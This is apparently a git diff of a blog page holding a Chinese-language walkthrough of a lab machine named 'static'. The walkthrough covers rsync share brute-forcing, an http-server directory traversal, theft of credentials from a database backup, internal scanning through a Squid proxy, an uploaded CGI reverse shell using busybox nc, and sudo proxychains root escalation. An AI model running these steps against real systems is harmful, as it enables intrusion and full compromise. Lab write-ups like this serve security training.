@@ -42,7 +42,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/vlx_static.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>vlx_static</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -66,7 +66,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -101,19 +111,18 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>1.1 主机发现</h2>
 <p>使用 arp-scan 进行局域网主机扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.189 08:00:27:c4:3a:e0       PCS Systemtechnik GmbH
-...
-</code></pre>
-<p>发现目标主机 IP 为 <code>192.168.205.189</code>。</p>
+...</pre></div>
+<p>发现目标主机 IP 为 <code class="notranslate">192.168.205.189</code>。</p>
 <h2>1.2 端口扫描</h2>
 <p>对目标进行全端口扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.189
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 10:09 CST
-Nmap scan report for 192.168.205.189
+Nmap scan report <span class="pl-k">for</span> 192.168.205.189
 Host is up (0.00021s latency).
 Not shown: 65531 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -122,8 +131,7 @@ PORT     STATE SERVICE
 873/tcp  open  rsync
 3128/tcp open  squid-http
 8080/tcp open  http-proxy
-...
-</code></pre>
+...</pre></div>
 <p>发现开放端口：</p>
 <ul>
 <li><strong>22/tcp</strong> - SSH 服务</li>
@@ -135,157 +143,144 @@ PORT     STATE SERVICE
 <h1>二、服务枚举</h1>
 <h2>2.1 Rsync 服务探测</h2>
 <p>尝试列出 rsync 共享目录：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ rsync -av --list-only rsync://192.168.205.189
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ rsync -av --list-only rsync://192.168.205.189</pre></div>
 <p>无法直接获取目录列表。群主通过字典爆破发现了共享名：</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250913111727187.webp" alt="image-20250913101134146" /></p>
-<pre lang="bash"><code>for i in $(cat /usr/share/seclists/Discovery/Web-Content/common.txt);do 
-    echo $i
-    rsync -av --list-only rsync://192.168.205.189/$i 2&gt;&amp;1|grep -Piv 'error'|grep .
-done
-</code></pre>
-<p>发现存在 <code>_dev</code> 共享目录，但需要身份验证。群主尝试密码爆破但没有成功。</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250913111724416.webp" alt="image-20250913101313414" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d40b601afc0142acb42eca1b628842dc7327e2e558fee7359f430c22f56fefbb/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732373138372e77656270"><img src="https://camo.githubusercontent.com/d40b601afc0142acb42eca1b628842dc7327e2e558fee7359f430c22f56fefbb/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732373138372e77656270" alt="image-20250913101134146" data-canonical-src="http://7r1UMPHK.github.io/image/20250913111727187.webp" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">$(</span>cat /usr/share/seclists/Discovery/Web-Content/common.txt<span class="pl-pds">)</span></span><span class="pl-k">;</span><span class="pl-k">do</span> 
+    <span class="pl-c1">echo</span> <span class="pl-smi">$i</span>
+    rsync -av --list-only rsync://192.168.205.189/<span class="pl-smi">$i</span> <span class="pl-k">2&gt;&amp;1</span><span class="pl-k">|</span>grep -Piv <span class="pl-s"><span class="pl-pds">'</span>error<span class="pl-pds">'</span></span><span class="pl-k">|</span>grep <span class="pl-c1">.</span>
+<span class="pl-k">done</span></pre></div>
+<p>发现存在 <code class="notranslate">_dev</code> 共享目录，但需要身份验证。群主尝试密码爆破但没有成功。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/004a62bf5538a0525f2708190edc018c476a6c794d5a961b7c3e3fd3c4d5d852/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732343431362e77656270"><img src="https://camo.githubusercontent.com/004a62bf5538a0525f2708190edc018c476a6c794d5a961b7c3e3fd3c4d5d852/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732343431362e77656270" alt="image-20250913101313414" data-canonical-src="http://7r1UMPHK.github.io/image/20250913111724416.webp" style="max-width: 100%;"></a></p>
 <h2>2.2 HTTP 服务 (8080端口)</h2>
 <p>该端口运行的是 static HTTP server。HYH 大佬发现其使用的是 <a href="https://github.com/http-party/http-server">http-party/http-server</a>，版本较老（2022年）。</p>
 <p>目录爆破结果：</p>
-<pre lang="bash"><code>200      GET      368l      933w    10701c http://192.168.205.189/
+<div class="highlight highlight-source-shell"><pre class="notranslate">200      GET      368l      933w    10701c http://192.168.205.189/
 200      GET      368l      933w    10701c http://192.168.205.189/index.html
-301      GET        9l       28w      323c http://192.168.205.189/javascript =&gt; http://192.168.205.189/javascript/
-...
-</code></pre>
+301      GET        9l       28w      323c http://192.168.205.189/javascript =<span class="pl-k">&gt;</span> http://192.168.205.189/javascript/
+...</pre></div>
 <p>初步扫描没有发现有价值的信息。</p>
 <h2>2.3 Squid 代理服务</h2>
 <p>尝试使用代理时提示需要身份验证。通过构造特定响应可以爆破用户名（暂时没用搁置）：</p>
-<pre lang="bash"><code>resp=$(curl -U &quot;$usr:1&quot; -x &quot;$proxy&quot; &quot;$target&quot; 2&gt;/dev/null)
-if [[ &quot;$resp&quot; != *&quot;No%20such%20user&quot;* ]]; then
-    # 用户存在
-fi
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">resp=<span class="pl-s"><span class="pl-pds">$(</span>curl -U <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$usr</span>:1<span class="pl-pds">"</span></span> -x <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$proxy</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$target</span><span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null<span class="pl-pds">)</span></span>
+<span class="pl-k">if</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$resp</span><span class="pl-pds">"</span></span> <span class="pl-k">!=</span> <span class="pl-k">*</span><span class="pl-s"><span class="pl-pds">"</span>No%20such%20user<span class="pl-pds">"</span></span><span class="pl-k">*</span> ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c"><span class="pl-c">#</span> 用户存在</span>
+<span class="pl-k">fi</span></pre></div>
 <p>此时 Fzer0FA、HYH、Aristore 等多位大佬也在尝试图片隐写等其他方向。</p>
 <h1>三、漏洞利用</h1>
 <h2>3.1 http-server 目录遍历漏洞</h2>
-<p>经过研究发现 http-party/http-server 存在目录遍历漏洞。参考：<a href="https://tripla.dk/2020/03/26/multiple-vulnerabilities-in-nodejs-ecstatic-http-server-http-party/">Multiple vulnerabilities in Node.js ecstatic/http-server</a></p>
-<p><img src="http://7r1UMPHK.github.io/image/20250913111725055.webp" alt="image-20250913102353524" /></p>
+<p>经过研究发现 http-party/http-server 存在目录遍历漏洞。参考：<a href="https://tripla.dk/2020/03/26/multiple-vulnerabilities-in-nodejs-ecstatic-http-server-http-party/" rel="nofollow">Multiple vulnerabilities in Node.js ecstatic/http-server</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/80fdfef9a58de280ca411eb1f44f09a113fbc7a49a302a143a0484f268a07775/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732353035352e77656270"><img src="https://camo.githubusercontent.com/80fdfef9a58de280ca411eb1f44f09a113fbc7a49a302a143a0484f268a07775/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732353035352e77656270" alt="image-20250913102353524" data-canonical-src="http://7r1UMPHK.github.io/image/20250913111725055.webp" style="max-width: 100%;"></a></p>
 <p>利用漏洞进行目录遍历：</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250913111727174.webp" alt="image-20250913102558551" /></p>
-<p>成功获取上级目录列表，发现 <code>bak2025</code> 目录，其中包含数据库备份文件 <code>backup2025-09-10.sql</code>。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6f4f9438c15c87702590808c4b7b2855bb5b225e3c1cce9f65c99f65327d6eac/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732373137342e77656270"><img src="https://camo.githubusercontent.com/6f4f9438c15c87702590808c4b7b2855bb5b225e3c1cce9f65c99f65327d6eac/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303931333131313732373137342e77656270" alt="image-20250913102558551" data-canonical-src="http://7r1UMPHK.github.io/image/20250913111727174.webp" style="max-width: 100%;"></a></p>
+<p>成功获取上级目录列表，发现 <code class="notranslate">bak2025</code> 目录，其中包含数据库备份文件 <code class="notranslate">backup2025-09-10.sql</code>。</p>
 <h2>3.2 数据库凭据提取</h2>
 <p>下载并分析数据库备份：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ wget http://192.168.205.189:8080/bak2025/backup2025-09-10.sql
 ...
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ sqlite3 backup2025-09-10.sql
 SQLite version 3.46.1 2024-08-13 09:16:08
-Enter &quot;.help&quot; for usage hints.
-sqlite&gt; .tables
+Enter <span class="pl-s"><span class="pl-pds">"</span>.help<span class="pl-pds">"</span></span> <span class="pl-k">for</span> usage hints.
+sqlite<span class="pl-k">&gt;</span> .tables
 users
-sqlite&gt; select * from users;
-1|dev|null
-2|admin|null
-3|proxy|Pr0xyH@sTh3P0w3r
-4|haris|null
-</code></pre>
-<p>获得凭据：<code>proxy:Pr0xyH@sTh3P0w3r</code></p>
+sqlite<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users<span class="pl-k">;</span>
+1<span class="pl-k">|</span>dev<span class="pl-k">|</span>null
+2<span class="pl-k">|</span>admin<span class="pl-k">|</span>null
+3<span class="pl-k">|</span>proxy<span class="pl-k">|</span>Pr0xyH@sTh3P0w3r
+4<span class="pl-k">|</span>haris<span class="pl-k">|</span>null</pre></div>
+<p>获得凭据：<code class="notranslate">proxy:Pr0xyH@sTh3P0w3r</code></p>
 <h1>四、权限获取</h1>
 <h2>4.1 测试凭据</h2>
 <p>SSH 登录失败，但 rsync 验证成功：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ rsync -av --list-only rsync://proxy@192.168.205.189/_dev
 Password: 
 receiving incremental file list
-drwxr-xr-x          4,096 2025/09/11 14:25:22 .
-...
-</code></pre>
+drwxr-xr-x          4,096 2025/09/11 14:25:22 <span class="pl-c1">.</span>
+...</pre></div>
 <p>目录为空，但可以上传文件。</p>
 <h2>4.2 内网服务探测</h2>
 <p>使用获得的凭据通过 Squid 代理访问内网：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8080
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;node.js http server&lt;/title&gt;
-  &lt;/head&gt;
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>node.js http server<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
   ...
-&lt;/html&gt;
-</code></pre>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
 <p>扫描内网端口：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ seq 1 65535 | xargs -P 50 -I {} sh -c 'curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:{} -s -o /dev/null -w &quot;%{http_code} {}\n&quot; -m 1 2&gt;/dev/null | grep &quot;^200&quot; | cut -d&quot; &quot; -f2'
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ seq 1 65535 <span class="pl-k">|</span> xargs -P 50 -I {} sh -c <span class="pl-s"><span class="pl-pds">'</span>curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:{} -s -o /dev/null -w "%{http_code} {}\n" -m 1 2&gt;/dev/null | grep "^200" | cut -d" " -f2<span class="pl-pds">'</span></span>
 80
 8000
-8080
-</code></pre>
+8080</pre></div>
 <p>发现 8000 端口：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;Internal Server&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;h1&gt;Internal Server&lt;/h1&gt;
-    &lt;p&gt;Access to the server is allowed only for authorized developers.&lt;/p&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Internal Server<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Internal Server<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+    <span class="pl-k">&lt;</span>p<span class="pl-k">&gt;</span>Access to the server is allowed only <span class="pl-k">for</span> authorized developers.<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
 <h2>4.3 CGI 脚本执行</h2>
-<p>目录爆破发现 <code>/cgi-bin/</code> 目录存在且返回 403。</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<p>目录爆破发现 <code class="notranslate">/cgi-bin/</code> 目录存在且返回 403。</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ dirsearch -u http://127.0.0.1:8000 --proxy http://192.168.205.189:3128 --proxy-auth proxy:Pr0xyH@sTh3P0w3r
 ...
 [10:46:49] 403 -  384B  - /cgi-bin/
 [10:46:49] 301 -    0B  - /cgi-bin  -&gt;  /cgi-bin/
 ...
 </code></pre>
-<p>推测 <code>_dev</code> 目录可能映射到 CGI 目录。</p>
+<p>推测 <code class="notranslate">_dev</code> 目录可能映射到 CGI 目录。</p>
 <p>测试文件上传和访问：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ echo &quot;hello hack&quot; &gt; test
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>hello hack<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> <span class="pl-c1">test</span>
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ rsync test rsync://proxy@192.168.205.189/_dev
+└─$ rsync <span class="pl-c1">test</span> rsync://proxy@192.168.205.189/_dev
 Password: 
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000/cgi-bin/test -v
 ...
-&lt; HTTP/1.1 200 OK
-...
-</code></pre>
+<span class="pl-k">&lt;</span> HTTP/1.1 200 OK
+...</pre></div>
 <p>返回 200，确认可以执行。上传反弹 shell：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ cat shell.cgi 
-#!/bin/bash
-echo &quot;Content-Type: text/html&quot;
-echo &quot;&quot;
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Content-Type: text/html<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
 
 busybox nc 192.168.205.128 8888 -e /bin/bash
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ rsync shell.cgi rsync://proxy@192.168.205.189/_dev
-Password: 
-</code></pre>
+Password: </pre></div>
 <p>监听并触发：</p>
-<pre lang="bash"><code># 监听端
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 监听端</span>
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 
-# 触发端
+<span class="pl-c"><span class="pl-c">#</span> 触发端</span>
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000/cgi-bin/shell.cgi
-</code></pre>
+└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000/cgi-bin/shell.cgi</pre></div>
 <p>成功获得 shell：</p>
-<pre lang="bash"><code>connect to [192.168.205.128] from (UNKNOWN) [192.168.205.189] 59038
+<div class="highlight highlight-source-shell"><pre class="notranslate">connect to [192.168.205.128] from (UNKNOWN) [192.168.205.189] 59038
 id
-uid=13(proxy) gid=13(proxy) grupos=13(proxy)
-</code></pre>
+uid=13(proxy) gid=13(proxy) grupos=13(proxy)</pre></div>
 <h1>五、权限提升</h1>
-<pre><code>script /dev/null -c bash
+<pre class="notranslate"><code class="notranslate">script /dev/null -c bash
 Ctrl+Z
 stty raw -echo; fg
 reset xterm
@@ -294,24 +289,21 @@ export SHELL=/bin/bash
 stty rows 36 columns 178
 </code></pre>
 <p>稳定 shell 后检查 sudo 权限：</p>
-<pre lang="bash"><code>proxy@static:/usr/bin$ sudo -l
-Matching Defaults entries for proxy on static:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+<div class="highlight highlight-source-shell"><pre class="notranslate">proxy@static:/usr/bin$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> proxy on static:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
 
 User proxy may run the following commands on static:
-    (root) NOPASSWD: /usr/bin/proxychains
-</code></pre>
+    (root) NOPASSWD: /usr/bin/proxychains</pre></div>
 <p>发现可以无密码执行 proxychains，直接利用获取 root：</p>
-<pre lang="bash"><code>proxy@static:/usr/bin$ sudo /usr/bin/proxychains bash
+<div class="highlight highlight-source-shell"><pre class="notranslate">proxy@static:/usr/bin$ sudo /usr/bin/proxychains bash
 ProxyChains-3.1 (http://proxychains.sf.net)
 root@static:/usr/bin# id
 uid=0(root) gid=0(root) grupos=0(root)
 root@static:/usr/bin# cat /root/root.txt /home/proxy/user.txt 
 1ec3b7ffaf9b33e1d09fc1c7046f25b4
-fde48ab5f20e345e99d05f73bb929bf4
-</code></pre>
-<p>成功获得 root 权限和 flag。</p>
-</div>
+fde48ab5f20e345e99d05f73bb929bf4</pre></div>
+<p>成功获得 root 权限和 flag。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -336,7 +328,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 